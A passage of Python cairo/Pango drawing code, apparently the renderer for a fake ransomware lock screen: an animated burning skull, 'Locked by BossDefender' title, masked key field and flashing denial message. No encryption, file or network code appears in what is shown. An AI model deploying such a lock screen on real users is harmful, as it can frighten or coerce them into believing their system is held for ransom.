            x + w * 0.40 + bend, y + h * 0.72,
            x + w * 0.50, y + h,
        )
        ctx.curve_to(
            x + w * 0.60 + bend, y + h * 0.70,
            x + w * 0.90, y + h * 0.38,
            x + w, y,
        )
        ctx.line_to(x + w, y)
        ctx.line_to(x, y)
    else:
        ctx.move_to(x, y + h)
        ctx.curve_to(
            x + w * 0.10, y + h * 0.60,
            x + w * 0.40 + bend, y + h * 0.28,
            x + w * 0.50, y,
        )
        ctx.curve_to(
            x + w * 0.60 + bend, y + h * 0.30,
            x + w * 0.90, y + h * 0.62,
            x + w, y + h,
        )
        ctx.line_to(x + w, y + h)
        ctx.line_to(x, y + h)
    ctx.close_path()


def brow_path(ctx) -> None:
    ctx.new_path()
    ctx.move_to(116, 232)
    ctx.curve_to(170, 180, 235, 188, 300, 218)
    ctx.curve_to(365, 188, 430, 180, 484, 232)
    ctx.curve_to(424, 222, 360, 214, 300, 236)
    ctx.curve_to(240, 214, 176, 222, 116, 232)
    ctx.close_path()


def brow_ridge_path(ctx) -> None:
    ctx.new_path()
    ctx.move_to(132, 228)
    ctx.curve_to(190, 194, 242, 201, 286, 226)
    # GDI+ joins the two AddBezier calls with a straight line because the
    # second one starts at (314, 226), not at the previous end point.
    ctx.line_to(314, 226)
    ctx.curve_to(358, 201, 410, 194, 468, 228)


def cheek_line_path(ctx) -> None:
    ctx.new_path()
    ctx.move_to(140, 332)
    ctx.curve_to(170, 360, 212, 371, 246, 358)
    # Same GDI+ connection as the brow ridge above.
    ctx.line_to(354, 358)
    ctx.curve_to(388, 371, 430, 360, 460, 332)


# ---------------------------------------------------------------------------
# Static skull base (cached at 600x600)
# ---------------------------------------------------------------------------

class CrackSpec:
    __slots__ = ("points", "width", "phase", "intensity")

    def __init__(self, points, width, phase, intensity):
        self.points = points
        self.width = width
        self.phase = phase
        self.intensity = intensity


class CharSpec:
    __slots__ = ("x", "y", "rx", "ry", "color")

    def __init__(self, x, y, rx, ry, color):
        self.x = x
        self.y = y
        self.rx = rx
        self.ry = ry
        self.color = color


class DripSpec:
    __slots__ = ("x", "y", "length", "width", "phase", "speed")

    def __init__(self, x, y, length, width, phase, speed):
        self.x = x
        self.y = y
        self.length = length
        self.width = width
        self.phase = phase
        self.speed = speed


class SparkSpec:
    __slots__ = ("x", "y", "phase", "size")

    def __init__(self, x, y, phase, size):
        self.x = x
        self.y = y
        self.phase = phase
        self.size = size


def create_cracks() -> List[CrackSpec]:
    return [
        CrackSpec([(300, 47), (318, 88), (305, 122), (326, 155), (312, 188)], 2.4, 0.4, 1.1),
        CrackSpec([(318, 92), (344, 108), (352, 136)], 1.3, 2.3, 0.8),
        CrackSpec([(257, 71), (242, 108), (215, 133), (229, 169), (207, 197)], 2.0, 3.2, 0.95),
        CrackSpec([(467, 182), (449, 213), (458, 242), (442, 272)], 1.6, 1.1, 0.85),
        CrackSpec([(133, 192), (151, 221), (143, 249), (158, 276)], 1.4, 5.0, 0.8),
        CrackSpec([(151, 329), (173, 354), (161, 382), (174, 405)], 1.5, 0.8, 0.9),
        CrackSpec([(448, 333), (427, 358), (438, 386), (421, 411)], 1.5, 4.2, 0.9),
        CrackSpec([(236, 516), (248, 536), (240, 553)], 1.3, 2.8, 0.75),
        CrackSpec([(364, 516), (352, 536), (360, 553)], 1.3, 3.9, 0.75),
        CrackSpec([(300, 520), (315, 538), (307, 555)], 1.0, 1.6, 0.7),
        CrackSpec([(282, 318), (294, 337), (286, 355)], 1.0, 0.9, 0.65),
        CrackSpec([(405, 145), (425, 160), (432, 183), (454, 196)], 1.1, 2.2, 0.7),
    ]


def create_charring() -> List[CharSpec]:
    rng = random.Random(80517)
    result = []
    for _ in range(72):
        x = 110.0 + rng.random() * 380.0
        y = 54.0 + rng.random() * 500.0
        rx = 6.0 + rng.random() * 37.0
        ry = 5.0 + rng.random() * 30.0
        pick = rng.randint(0, 4)
        if pick == 0:
            color = rgba(4, 1, 0, 18 + rng.randint(0, 27))
        elif pick == 1:
            color = rgba(116, 36, 16, 12 + rng.randint(0, 21))
        elif pick == 2:
            color = rgba(185, 80, 45, 10 + rng.randint(0, 17))
        elif pick == 3:
            color = rgba(75, 46, 34, 10 + rng.randint(0, 19))
        else:
            color = rgba(20, 9, 6, 12 + rng.randint(0, 21))
        result.append(CharSpec(x, y, rx, ry, color))
    return result


SOOT_STREAKS = [
    (174, 242), (155, 300), (166, 362), (151, 420),
    (214, 250), (201, 306), (212, 370), (200, 435),
    (248, 260), (238, 320), (249, 382), (239, 449),
    (341, 260), (355, 320), (344, 382), (357, 449),
    (386, 250), (401, 306), (390, 370), (405, 435),
    (426, 242), (445, 300), (434, 362), (449, 420),
]


def create_drips() -> List[DripSpec]:
    rng = random.Random(6127)
    xs = (184, 205, 235, 266, 300, 334, 365, 395, 416, 152, 448, 251, 349)
    ys = (302, 332, 365, 516, 540, 516, 365, 332, 302, 352, 352, 508, 508)
    result = []
    for i, (x, y) in enumerate(zip(xs, ys)):
        if i < 3 or i > 8:
            length = 32.0 + rng.random() * 78.0
            width = 4.0 + rng.random() * 4.0
        else:
            length = 58.0 + rng.random() * 105.0
            width = 6.0 + rng.random() * 7.0
        result.append(DripSpec(x, y, length, width,
                               rng.random(), 0.24 + rng.random() * 0.38))
    return result


def create_sparks() -> List[SparkSpec]:
    rng = random.Random(9127)
    result = []
    for _ in range(22):
        side = -1.0 if rng.randint(0, 1) == 0 else 1.0
        result.append(SparkSpec(
            300.0 + side * (125.0 + rng.random() * 155.0),
            280.0 + rng.random() * 240.0,
            rng.random(),
            0.9 + rng.random() * 2.1,
        ))
    return result


CRACKS = create_cracks()
CHARRING = create_charring()
DRIPS = create_drips()
SPARKS = create_sparks()
SKULL_STATIC = None


def draw_base(ctx) -> None:
    fill_linear(ctx, 82, 28, 82, 576, (
        (0.00, rgba(78, 46, 34)),
        (0.30, rgba(54, 28, 21)),
        (0.64, rgba(27, 11, 8)),
        (1.00, rgba(10, 4, 3)),
    ))
    skull_path(ctx)
    ctx.fill()


def draw_charring(ctx) -> None:
    ctx.save()
    skull_path(ctx)
    ctx.clip()
    for blot in CHARRING:
        fill_ellipse(ctx, blot.x, blot.y, blot.rx, blot.ry, blot.color)

    ctx.set_line_width(7.0)
    ctx.set_line_cap(cairo.LINE_CAP_ROUND)
    ctx.set_line_join(cairo.LINE_JOIN_ROUND)
    set_color(ctx, rgba(0, 0, 0, 48))
    for i in range(0, len(SOOT_STREAKS), 4):
        catmull_rom_path(ctx, SOOT_STREAKS[i:i + 4], 0.45)
        ctx.stroke()
    ctx.restore()


def draw_brow(ctx) -> None:
    brow_path(ctx)
    set_color(ctx, rgba(0, 0, 0, 150))
    ctx.fill()

    brow_ridge_path(ctx)
    set_color(ctx, rgba(165, 95, 62, 62))
    ctx.set_line_width(2.5)
    ctx.set_line_cap(cairo.LINE_CAP_ROUND)
    ctx.stroke()


def draw_cheek_hollows(ctx) -> None:
    for x, y, w, h in (
        (146, 286, 102, 126),
        (352, 286, 102, 126),
        (118, 164, 58, 98),
        (424, 164, 58, 98),
    ):
        fill_ellipse(ctx, x + w / 2.0, y + h / 2.0, w / 2.0, h / 2.0,
                     rgba(0, 0, 0, 92))

    cheek_line_path(ctx)
    set_color(ctx, rgba(160, 94, 68, 72))
    ctx.set_line_width(2.2)
    ctx.set_line_cap(cairo.LINE_CAP_ROUND)
    ctx.stroke()


def draw_socket_cavity(ctx, left: bool, pulse: float) -> None:
    socket_path(ctx, left)
    b = path_bounds(ctx)
    cx = b[0] + b[2] * 0.50
    cy = b[1] + b[3] * 0.48
    soft_glow(ctx, cx, cy, b[2] * 0.72, b[3] * 0.86,
              rgba(255, 64, 10, 38 + int(18 * pulse)), rgba(90, 9, 1, 0))
    socket_path(ctx, left)
    set_color(ctx, rgba(3, 0, 0, 250))
    ctx.fill()


def draw_nose_cavity(ctx) -> None:
    nose_path(ctx)
    set_color(ctx, rgba(2, 0, 0, 248))
    ctx.fill()


def draw_mouth_cavity(ctx) -> None:
    fill_linear(ctx, 174, 396, 174, 514, (
        (0.0, rgba(45, 3, 2)),
        (1.0, rgba(4, 0, 0)),
    ))
    mouth_path(ctx)
    ctx.fill()


def draw_bone_highlights(ctx) -> None:
    ctx.set_line_width(2.0)
    ctx.set_line_cap(cairo.LINE_CAP_ROUND)
    set_color(ctx, rgba(188, 112, 78, 78))

    # Temple highlight, connected across the top of the skull.  GDI+ adds a
    # straight line from (236,82) to (364,82) before the second curve.
    ctx.new_path()
    ctx.move_to(129, 186)
    ctx.curve_to(145, 147, 188, 110, 236, 82)
    ctx.line_to(364, 82)
    ctx.curve_to(412, 110, 455, 147, 471, 186)
    ctx.stroke()

    # The two jaw highlights are separate strokes.  (This matches the fixed
    # fake_ransom.cs; without separate subpaths GDI+ joins them with lines.)
    ctx.new_path()
    ctx.move_to(162, 430)
    ctx.curve_to(184, 464, 216, 492, 250, 516)
    ctx.stroke()

    ctx.new_path()
    ctx.move_to(350, 516)
    ctx.curve_to(384, 492, 416, 464, 438, 430)
    ctx.stroke()

    ctx.set_line_width(1.5)
    set_color(ctx, rgba(214, 130, 87, 48))
    ctx.new_path()
    ctx.move_to(264, 534)
    ctx.curve_to(282, 548, 318, 548, 336, 534)
    ctx.stroke()


def draw_outline(ctx, pulse: float) -> None:
    skull_path(ctx)
    set_color(ctx, rgba(5, 1, 0, 245))
    ctx.set_line_width(5.0)
    ctx.stroke()

    fill_linear(ctx, 80, 30, 80, 580, (
        (0.0, rgba(255, 134, 62, 105 + int(25 * pulse))),
        (1.0, rgba(96, 20, 7, 8)),
    ))
    skull_path(ctx)
    ctx.set_line_width(2.7)
    ctx.stroke()


def build_skull_static():
    surface = cairo.ImageSurface(cairo.FORMAT_ARGB32, 600, 600)
    ctx = cairo.Context(surface)
    ctx.set_antialias(cairo.ANTIALIAS_BEST)
    ctx.set_line_join(cairo.LINE_JOIN_ROUND)

    draw_base(ctx)
    draw_charring(ctx)

    ctx.save()
    skull_path(ctx)
    ctx.clip()
    draw_brow(ctx)
    draw_cheek_hollows(ctx)
    draw_socket_cavity(ctx, True, 0.5)
    draw_socket_cavity(ctx, False, 0.5)
    draw_nose_cavity(ctx)
    draw_mouth_cavity(ctx)
    draw_bone_highlights(ctx)
    ctx.restore()

    draw_outline(ctx, 0.5)
    return surface


def get_skull_static():
    global SKULL_STATIC
    if SKULL_STATIC is None:
        SKULL_STATIC = build_skull_static()
    return SKULL_STATIC


# ---------------------------------------------------------------------------
# Dynamic skull layers
# ---------------------------------------------------------------------------

def draw_outer_glow(ctx, pulse: float) -> None:
    alpha = 20 + int(14 * pulse)
    skull_path(ctx)
    ctx.set_line_width(30.0)
    set_color(ctx, rgba(255, 68, 8, alpha))
    ctx.stroke_preserve()
    ctx.set_line_width(16.0)
    set_color(ctx, rgba(255, 82, 14, alpha + 20))
    ctx.stroke_preserve()
    ctx.set_line_width(7.0)
    set_color(ctx, rgba(255, 110, 32, alpha + 34))
    ctx.stroke()


def draw_socket(ctx, left: bool, time_s: float, pulse: float) -> None:
    socket_path(ctx, left)
    b = path_bounds(ctx)
    cx = b[0] + b[2] * 0.50
    cy = b[1] + b[3] * 0.48

    ctx.save()
    socket_path(ctx, left)
    ctx.clip()

    soft_glow(ctx, cx, cy + 4.0, b[2] * 0.57, b[3] * 0.58,
              rgba(255, 208, 88, 235), rgba(255, 78, 8, 0))
    soft_glow(ctx, cx, cy, b[2] * 0.31, b[3] * 0.31,
              rgba(255, 245, 178, 220), rgba(255, 150, 30, 0))

    draw_flame(ctx, cx, cy + b[3] * 0.42, b[2] * 0.65, b[3] * 0.92,
               1.4 if left else 4.1, -5.0 if left else 5.0,
               time_s, 1.2, True)
    draw_flame(ctx, cx, cy + b[3] * 0.42, b[2] * 0.33, b[3] * 0.64,
               4.9 if left else 1.9, 7.0 if left else -7.0,
               time_s, 1.0, True)

    eye_slit_path(ctx, cx, cy, left, 1.0)
    set_color(ctx, rgba(255, 196, 92, 225))
    ctx.fill()
    eye_slit_path(ctx, cx, cy, left, 0.48)
    set_color(ctx, rgba(255, 249, 198, 250))
    ctx.fill()
    ctx.restore()

    socket_path(ctx, left)
    set_color(ctx, rgba(8, 1, 1, 230))
    ctx.set_line_width(4.5)
    ctx.stroke()
    socket_path(ctx, left)
    set_color(ctx, rgba(255, 82, 18, 130))
    ctx.set_line_width(1.8)
    ctx.stroke()

    for i in range(4):
        phase = i * 1.8 + (0.4 if left else 2.1)
        sx = cx + math.sin(time_s * 2.2 + phase) * b[2] * 0.60
        sy = cy - b[3] * 0.30 - ((time_s * 8.0 + i * 11.0) % 38.0)
        size = 1.1 + i * 0.35
        fill_ellipse(ctx, sx, sy, size * 3.0, size * 3.0,
                     rgba(255, 80, 15, 35))
        fill_ellipse(ctx, sx, sy, size, size, rgba(255, 198, 92, 200))


def draw_sockets(ctx, time_s: float, pulse: float) -> None:
    draw_socket(ctx, True, time_s, pulse)
    draw_socket(ctx, False, time_s, pulse)


def draw_nose(ctx, time_s: float, pulse: float) -> None:
    nose_path(ctx)
    ctx.save()
    nose_path(ctx)
    ctx.clip()
    soft_glow(ctx, 300, 365, 32, 28,
              rgba(255, 104, 24, 110 + int(25 * pulse)), rgba(120, 18, 1, 0))
    draw_flame(ctx, 300, 380, 22, 52, 2.8, 1.0, time_s, 0.75, True)
    ctx.restore()

    nose_path(ctx)
    set_color(ctx, rgba(116, 47, 28, 170))
    ctx.set_line_width(1.8)
    ctx.stroke()

    fill_ellipse(ctx, 300, 366, 5, 6, rgba(255, 101, 26, 155))


def draw_tooth(ctx, r: Rect, upper: bool, index: int) -> None:
    x, y, w, h = r
    bend = (1.0 if index % 2 == 0 else -1.0) * w * 0.08
    tooth_path(ctx, x, y, w, h, upper, index)

    root = rgba(34, 20, 16) if index in (3, 7) else rgba(57, 34, 25)
    tip = rgba(102, 81, 59) if index in (3, 7) else rgba(186, 160, 121)
    low = root if upper else tip
    high = tip if upper else root
    fill_linear(ctx, x - 1, y - 1, x - 1, y + h + 1, (
        (0.0, low),
        (1.0, high),
    ))
    ctx.fill()

    tooth_path(ctx, x, y, w, h, upper, index)
    set_color(ctx, rgba(12, 4, 2, 230))
    ctx.set_line_width(1.5)
    ctx.stroke()

    ctx.set_line_width(1.1)
    ctx.set_line_cap(cairo.LINE_CAP_ROUND)
    set_color(ctx, rgba(255, 224, 164, 52))
    sx = x + w * 0.30
    sy1 = y + h * 0.22 if upper else y + h * 0.78
    sy2 = y + h * 0.70 if upper else y + h * 0.30
    ctx.move_to(sx, sy1)
    ctx.line_to(sx + w * 0.10, sy2)
    ctx.stroke()

    if index % 4 == 0:
        fill_ellipse(ctx, x + w * 0.50, y + h * 0.71,
                     w * 0.15, h * 0.11, rgba(9, 3, 2, 105))


def draw_mouth(ctx, time_s: float, pulse: float) -> None:
    mouth_path(ctx)
    ctx.save()
    mouth_path(ctx)
    ctx.clip()
    soft_glow(ctx, 300, 474, 112, 67,
              rgba(255, 74, 9, 150 + int(22 * pulse)), rgba(100, 12, 1, 0))
    draw_flame(ctx, 300, 501, 86, 91, 3.1, 2.0, time_s, 0.95, True)
    draw_flame(ctx, 264, 505, 40, 56, 0.7, -7.0, time_s, 0.8, True)
    draw_flame(ctx, 338, 505, 38, 61, 5.2, 8.0, time_s, 0.8, True)
    ctx.restore()

    for i in range(10):
        if i == 4:
            continue
        x = 202.0 + i * 19.5
        w = 17.5
        h = 25.0 + (i % 3) * 6.0
        if i == 0 or i == 9:
            h += 12.0
        draw_tooth(ctx, (x, 414.0, w, h), True, i)

    for i in range(9):
        if i == 2 or i == 6:
            continue
        x = 214.0 + i * 20.0
        w = 17.5
        h = 17.0 + (i % 4) * 4.0
        draw_tooth(ctx, (x, 489.0 - h, w, h), False, i)

    ctx.set_line_width(5.5)
    ctx.set_line_cap(cairo.LINE_CAP_ROUND)
    set_color(ctx, rgba(18, 3, 2, 205))
    catmull_rom_path(ctx, ((201, 418), (256, 409), (344, 409), (399, 418)), 0.4)
    ctx.stroke()
    catmull_rom_path(ctx, ((216, 489), (264, 496), (338, 496), (386, 489)), 0.4)
    ctx.stroke()

    mouth_path(ctx)
    set_color(ctx, rgba(37, 7, 4, 225))
    ctx.set_line_width(3.6)
    ctx.stroke()


def draw_cracks(ctx, time_s: float) -> None:
    for crack in CRACKS:
        flicker = 0.72 + 0.28 * math.sin(time_s * 4.2 + crack.phase)
        ctx.new_path()
        ctx.move_to(*crack.points[0])
        for point in crack.points[1:]:
            ctx.line_to(*point)
        ctx.set_line_cap(cairo.LINE_CAP_ROUND)
        ctx.set_line_join(cairo.LINE_JOIN_ROUND)

        ctx.set_line_width(crack.width + 2.2)
        set_color(ctx, rgba(8, 2, 1, 235))
        ctx.stroke_preserve()

        ctx.set_line_width(crack.width + 8.0)
        set_color(ctx, rgba(255, 72, 8, int(26 * flicker * crack.intensity)))
        ctx.stroke_preserve()

        ctx.set_line_width(crack.width)
        set_color(ctx, rgba(255, 126, 28, int(190 * flicker)))
        ctx.stroke_preserve()

        ctx.set_line_width(max(0.7, crack.width * 0.42))
        set_color(ctx, rgba(255, 225, 130, int(205 * flicker)))
        ctx.stroke()


def draw_drips(ctx, time_s: float) -> None:
    for drip in DRIPS:
        cycle = (time_s * drip.speed + drip.phase) % 1.0
        grow = min(1.0, cycle / 0.68)
        grow = 1.0 - (1.0 - grow) * (1.0 - grow)
        length = max(3.0, drip.length * grow)
        w = drip.width
        wobble = math.sin(time_s * 5.4 + drip.phase * 7.0) * w * 0.30
        x = drip.x

        ctx.new_path()
        ctx.move_to(x - w * 0.5, drip.y)
        ctx.curve_to(
            x - w * 0.45 + wobble, drip.y + length * 0.30,
            x - w * 0.24, drip.y + length * 0.78,
            x - w * 0.10, drip.y + length,
        )
        ctx.curve_to(
            x, drip.y + length + w * 0.45,
            x + w * 0.10, drip.y + length,
            x + w * 0.10, drip.y + length,
        )
        ctx.curve_to(
            x + w * 0.26, drip.y + length * 0.78,
            x + w * 0.45 + wobble, drip.y + length * 0.30,
            x + w * 0.5, drip.y,
        )
        ctx.close_path()

        ctx.set_line_width(w + 7.0)
        ctx.set_line_cap(cairo.LINE_CAP_ROUND)
        set_color(ctx, rgba(255, 62, 7, 34))
        ctx.stroke_preserve()

        fill_linear(ctx, x, drip.y, x, drip.y + length + w, (
            (0.0, rgba(255, 236, 158, 245)),
            (1.0, rgba(255, 58, 5, 120)),
        ))
        ctx.fill()

        ctx.set_line_width(max(1.1, w * 0.20))
        ctx.set_line_cap(cairo.LINE_CAP_ROUND)
        set_color(ctx, rgba(255, 221, 117, 185))
        ctx.move_to(x + wobble * 0.2, drip.y + 1.0)
        ctx.line_to(x, drip.y + length * 0.94)
        ctx.stroke()

        if cycle > 0.76:
            fall = (cycle - 0.76) / 0.24
            dy = drip.y + length + fall * drip.length * 0.82
            dr = max(1.5, w * (0.55 - fall * 0.30))
            alpha = int(210 * (1.0 - fall * 0.65))
            fill_ellipse(ctx, x, dy, dr * 4.0, dr * 4.0,
                         rgba(255, 70, 8, int(38 * (1.0 - fall * 0.5))))
            fill_ellipse(ctx, x, dy, dr, dr * 1.6,
                         rgba(255, 156, 52, max(0, alpha)))
            fill_ellipse(ctx, x, dy, dr * 0.45, dr * 0.9,
                         rgba(255, 242, 170, max(0, alpha)))


def draw_skull_sparks(ctx, time_s: float) -> None:
    for spark in SPARKS:
        rise = (time_s * 17.0 + spark.phase * 40.0) % 54.0
        x = spark.x + math.sin(time_s * 2.4 + spark.phase) * 8.0
        y = spark.y - rise
        s = spark.size
        fill_ellipse(ctx, x, y, s * 4.0, s * 4.0, rgba(255, 84, 16, 30))
        fill_ellipse(ctx, x, y, s * 1.8, s * 1.8, rgba(255, 137, 42, 115))
        fill_ellipse(ctx, x, y, s * 0.7, s * 0.7, rgba(255, 213, 128, 225))


def draw_skull(ctx, bounds: Rect, time_s: float, pulse: float) -> None:
    if bounds[2] < 2.0 or bounds[3] < 2.0:
        return
    ctx.save()
    ctx.translate(bounds[0], bounds[1])
    ctx.scale(bounds[2] / 600.0, bounds[3] / 600.0)
    ctx.set_antialias(cairo.ANTIALIAS_BEST)
    ctx.set_line_join(cairo.LINE_JOIN_ROUND)

    draw_mane_flames(ctx, time_s)
    draw_outer_glow(ctx, pulse)
    ctx.set_source_surface(get_skull_static(), 0, 0)
    ctx.paint()

    draw_sockets(ctx, time_s, pulse)
    draw_nose(ctx, time_s, pulse)
    draw_mouth(ctx, time_s, pulse)
    draw_cracks(ctx, time_s)
    draw_foreground_flames(ctx, time_s)
    draw_drips(ctx, time_s)
    draw_skull_sparks(ctx, time_s)
    ctx.restore()


# ---------------------------------------------------------------------------
# Title text, key field and status line
# ---------------------------------------------------------------------------

def draw_glow_text(ctx, text: str, family: str, size_px: float, rect: Rect,
                   top_color: Color, bottom_color: Color, glow_color: Color,
                   glow_radius: float, glow_alpha: int, bold: bool,
                   Pango, PangoCairo) -> None:
    layout = make_layout(ctx, text, family, size_px, bold, Pango, PangoCairo)

    # Layered, offset copies create a soft fire bloom.
    for layer in (3, 2, 1):
        radius = glow_radius * (layer / 3.0)
        alpha = max(1, glow_alpha // (layer + 1))
        points = 16 if layer == 3 else 12
        ctx.set_source_rgba(glow_color[0], glow_color[1], glow_color[2],
                            alpha / 255.0)
        for i in range(points):
            angle = i * math.tau / points
            show_layout_centered(
                ctx, layout, rect,
                math.cos(angle) * radius, math.sin(angle) * radius,
                PangoCairo,
            )

    set_color(ctx, rgba(8, 1, 1, 225))
    show_layout_centered(ctx, layout, rect, 2.0, 4.0, PangoCairo)

    set_color(ctx, rgba(22, 4, 2, 245))
    for i in range(8):
        angle = i * math.pi / 4.0
        show_layout_centered(
            ctx, layout, rect,
            math.cos(angle) * 1.6, math.sin(angle) * 1.6,
            PangoCairo,
        )

    fill_linear(ctx, rect[0], rect[1], rect[0], rect[1] + rect[3], (
        (0.0, top_color),
        (1.0, bottom_color),
    ))
    show_layout_centered(ctx, layout, rect, 0.0, 0.0, PangoCairo)

    set_color(ctx, rgba(255, 210, 150, 30))
    show_layout_centered(ctx, layout, rect, 0.0, -rect[3] * 0.025, PangoCairo)


def draw_field_brackets(ctx, field: Rect, flash: float) -> None:
    inset = max(6.0, field[3] * 0.16)
    length = max(10.0, field[3] * 0.30)
    width = max(1.4, field[3] * 0.025)
    alpha = clamp_alpha(170.0 * flash + 20.0)
    set_color(ctx, rgba(255, 118, 45, alpha))
    ctx.set_line_width(width)
    ctx.set_line_cap(cairo.LINE_CAP_BUTT)

    left = field[0] + inset
    right = rect_right(field) - inset
    top = field[1] + inset
    bottom = rect_bottom(field) - inset

    ctx.move_to(left, top)
    ctx.line_to(left + length, top)
    ctx.move_to(left, top)
    ctx.line_to(left, top + length)
    ctx.move_to(right, top)
    ctx.line_to(right - length, top)
    ctx.move_to(right, top)
    ctx.line_to(right, top + length)
    ctx.move_to(left, bottom)
    ctx.line_to(left + length, bottom)
    ctx.move_to(left, bottom)
    ctx.line_to(left, bottom - length)
    ctx.move_to(right, bottom)
    ctx.line_to(right - length, bottom)
    ctx.move_to(right, bottom)
    ctx.line_to(right, bottom - length)
    ctx.stroke()


def draw_field_contents(ctx, field: Rect, time_s: float, typed: str,
                        layout: Layout, Pango, PangoCairo) -> None:
    if not typed:
        layout_text = make_layout(
            ctx, PLACEHOLDER, layout_mono_family(layout), layout.placeholder_size,
            True, Pango, PangoCairo,
        )
        set_color(ctx, rgba(255, 82, 20, 55))
        for i in range(6):
            angle = i * math.pi / 3.0
            show_layout_centered(
                ctx, layout_text, field,
                math.cos(angle) * 2.2, math.sin(angle) * 2.2,
                PangoCairo,
            )
        set_color(ctx, rgba(186, 112, 72, 205))
        show_layout_centered(ctx, layout_text, field, 0.0, 0.0, PangoCairo)
        return

    radius = max(2.8, field[3] * 0.075)
    spacing = radius * 2.35
    total = radius * 2.0 + (len(typed) - 1) * spacing
    start_x = field[0] + (field[2] - total) / 2.0 + radius
    cy = field[1] + field[3] * 0.50

    for i in range(len(typed)):
        cx = start_x + i * spacing
        fill_ellipse(ctx, cx, cy, radius * 2.1, radius * 2.1,
                     rgba(255, 93, 25, 65))
        fill_ellipse(ctx, cx, cy, radius * 1.15, radius * 1.15,
                     rgba(207, 62, 21, 205))
        fill_ellipse(ctx, cx, cy, radius * 0.72, radius * 0.72,
                     rgba(255, 188, 105, 255))

    if (time_s % 1.1) < 0.62:
        caret_x = start_x + len(typed) * spacing
        set_color(ctx, rgba(255, 154, 72, 230))
        ctx.set_line_width(max(1.5, field[3] * 0.032))
        ctx.move_to(caret_x, cy - field[3] * 0.23)
        ctx.line_to(caret_x, cy + field[3] * 0.23)
        ctx.stroke()


# The renderer stores the mono family in a module-level variable so the small
# text helpers can stay independent of the class.
_RENDERER_MONO_FAMILY = "monospace"


def layout_mono_family(layout: Layout) -> str:
    return _RENDERER_MONO_FAMILY


def draw_key_field(ctx, layout: Layout, time_s: float, typed: str,
                   denied: bool, Pango, PangoCairo) -> None:
    field0 = layout.field
    shake = 0.0
    if denied:
        shake = math.sin(time_s * 72.0) * min(6.0, field0[2] * 0.006)
    field = (field0[0] + shake, field0[1], field0[2], field0[3])
    radius = max(5.0, field[3] * 0.12)
    flash = (0.65 + 0.35 * math.sin(time_s * 18.0)) if denied else 1.0

    for i in range(5, 0, -1):
        grow = i * max(2.0, field[3] * 0.055)
        halo = (field[0] - grow, field[1] - grow,
                field[2] + grow * 2.0, field[3] + grow * 2.0)
        rounded_rect_path(ctx, halo[0], halo[1], halo[2], halo[3],
                          radius + grow)
        set_color(ctx, rgba(255, 54, 12, clamp_alpha(5.0 * flash) + i * 3))
        ctx.set_line_width(max(1.0, field[3] * 0.018))
        ctx.stroke()

    rounded_rect_path(ctx, field[0], field[1], field[2], field[3], radius)
    fill_linear(ctx, field[0], field[1], field[0], field[1] + field[3], (
        (0.0, rgba(32, 4, 2, 235)),
        (1.0, rgba(7, 1, 0, 242)),
    ))
    ctx.fill()

    if denied:
        border = rgba(clamp_alpha(180.0 + 70.0 * flash),
                      clamp_alpha(22.0 + 30.0 * flash), 6, 255)
    else:
        border = rgba(214, 57, 20, 225)
    rounded_rect_path(ctx, field[0], field[1], field[2], field[3], radius)
    set_color(ctx, border)
    ctx.set_line_width(max(2.0, field[3] * 0.030))
    ctx.stroke()

    inner = (field[0] + 3.0, field[1] + 3.0,
             field[2] - 6.0, field[3] - 6.0)
    rounded_rect_path(ctx, inner[0], inner[1], inner[2], inner[3],
                      max(3.0, radius - 2.0))
    set_color(ctx, rgba(255, 130, 58, 95))
    ctx.set_line_width(1.0)
    ctx.stroke()

    draw_field_brackets(ctx, field, flash)
    draw_field_contents(ctx, field, time_s, typed, layout, Pango, PangoCairo)


def draw_status(ctx, layout: Layout, time_s: float, denied: bool,
                Pango, PangoCairo) -> None:
    if not denied:
        return
    status = layout.status
    flash = 0.60 + 0.40 * math.sin(time_s * 14.0)
    text_layout = make_layout(
        ctx, DENIED_TEXT, layout_mono_family(layout), layout.status_size,
        True, Pango, PangoCairo,
    )

    set_color(ctx, rgba(255, 32, 8, clamp_alpha(70.0 * flash)))
    show_layout_centered(ctx, text_layout, status, -4.0, 0.0, PangoCairo)
    show_layout_centered(ctx, text_layout, status, 4.0, 0.0, PangoCairo)

    set_color(ctx, rgba(10, 0, 0, 230))
    show_layout_centered(ctx, text_layout, status, 0.0, 2.0, PangoCairo)

    fill_linear(ctx, status[0], status[1], status[0], status[1] + status[3], (
        (0.0, rgba(255, 126, 70, 255)),
        (1.0, rgba(178, 10, 2, 255)),
    ))
    show_layout_centered(ctx, text_layout, status, 0.0, 0.0, PangoCairo)


# ---------------------------------------------------------------------------
# Frame renderer
# ---------------------------------------------------------------------------

class RansomRenderer:
    def __init__(self, w: int, h: int, Pango, PangoCairo):
        global _RENDERER_MONO_FAMILY
        self.w = max(1, int(w))
        self.h = max(1, int(h))
        self.Pango = Pango
        self.PangoCairo = PangoCairo
        self._measure_surface = cairo.ImageSurface(cairo.FORMAT_ARGB32, 8, 8)
        self._measure_ctx = cairo.Context(self._measure_surface)
        self.display_family = pick_display_family(PangoCairo)
        self.mono_family = pick_mono_family(PangoCairo)
        _RENDERER_MONO_FAMILY = self.mono_family
        self.layout = compute_layout(
            self.w, self.h, self._measure_ctx,
            self.display_family, self.mono_family,
            Pango, PangoCairo,
        )
        self.background = build_background_surface(self.w, self.h)
        self.title_surface, self.title_top = self._build_title_layer()

    def _build_title_layer(self):
        if self.w <= 0 or self.h <= 0:
            return None, 0
        margin = max(30.0, self.h * 0.040)
        top = max(0, int(math.floor(
            min(self.layout.locked[1], self.layout.name[1]) - margin)))
        bottom = min(self.h, int(math.ceil(
            max(rect_bottom(self.layout.locked), rect_bottom(self.layout.name))
            + margin)))
        height = max(1, bottom - top)
        surface = cairo.ImageSurface(cairo.FORMAT_ARGB32, self.w, height)
        ctx = cairo.Context(surface)
        ctx.set_antialias(cairo.ANTIALIAS_BEST)
        ctx.translate(0, -top)
        self._draw_title_core(ctx)
        return surface, top

    def _draw_title_core(self, ctx) -> None:
        locked = self.layout.locked
        name = self.layout.name
        draw_glow_text(
            ctx, "Locked by", self.display_family, self.layout.locked_size,
            locked,
            rgba(226, 210, 196, 245),
            rgba(126, 86, 68, 230),
            rgba(160, 58, 18, 255),
            7.0, 150, False, self.Pango, self.PangoCairo,
        )
        draw_glow_text(
            ctx, "BossDefender", self.display_family, self.layout.name_size,
            name,
            rgba(255, 138, 54, 255),
            rgba(108, 8, 2, 255),
            rgba(150, 35, 6, 255),
            11.0, 185, True, self.Pango, self.PangoCairo,
        )

    def draw(self, ctx, now: float, start: float, typed: str,
             denied_until: float) -> None:
        seconds = max(0.0, now - start)
        denied = now < denied_until
        pulse = 0.5 + 0.5 * math.sin(seconds * 2.1)

